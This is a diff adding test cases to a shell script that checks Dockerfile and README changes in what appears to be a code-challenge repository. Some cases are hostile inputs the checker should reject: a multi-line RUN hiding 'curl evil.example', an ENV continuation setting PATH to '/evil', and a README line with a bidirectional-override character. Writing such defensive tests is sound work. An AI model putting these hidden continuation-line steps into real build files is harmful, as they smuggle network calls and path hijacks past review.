@@ -91,13 +91,31 @@ dockerfile_case $'FROM cc-rt-sqlite:local
 COPY --from=ubuntu:24.04 /bin/sh /app/sh
 ENV CC_RUN=x
 ' dockerfile-copy-external
+# Continuation lines: a build stage may run a multi-line RUN, but the runtime stage may not hide one.
+dockerfile_case $'FROM code-challenge-sandbox:local AS build
+RUN echo one \
+ && echo two
+FROM cc-rt-sqlite:local
+COPY --from=build /etc/hostname /app/hostname
+ENV CC_RUN="cat /app/hostname"
+' good-dockerfile-multiline
+dockerfile_case $'FROM cc-rt-sqlite:local
+RUN echo one \
+ && curl evil.example
+ENV CC_RUN=x
+' dockerfile-run-multiline
+dockerfile_case $'FROM cc-rt-sqlite:local
+ENV CC_RUN=x \
+    PATH=/evil
+' dockerfile-env-multiline
 case_branch readme-blob   "$good && printf 'abc \xe2\x80\xae evil\n' >> README.md"
 
 scope() { (cd "$repo" && "$here/scope-check.sh" master "$1" >/tmp/scope-$$.log 2>&1); local rc=$?; sed 's/^/    /' /tmp/scope-$$.log | grep -E 'FAIL|PASS'; rm -f /tmp/scope-$$.log; return $rc; }
 expect 0 "well-formed new entry passes" scope good
 expect 0 "well-formed Windows entry (check.ps1) passes" scope good-windows
 expect 0 "entry with a clean Dockerfile passes" scope good-dockerfile
-for b in dockerfile-bad-from dockerfile-run-final dockerfile-add dockerfile-env-path dockerfile-user-root dockerfile-copy-external; do
+expect 0 "entry with a multi-line build-stage RUN passes" scope good-dockerfile-multiline
+for b in dockerfile-run-multiline dockerfile-env-multiline dockerfile-bad-from dockerfile-run-final dockerfile-add dockerfile-env-path dockerfile-user-root dockerfile-copy-external; do
     expect 1 "rejects: $b" scope "$b"
 done
 for b in sandbox-edit workflow existing two-entries no-check binary symlink bidi zero-width control-chars odd-path too-large readme-blob; do
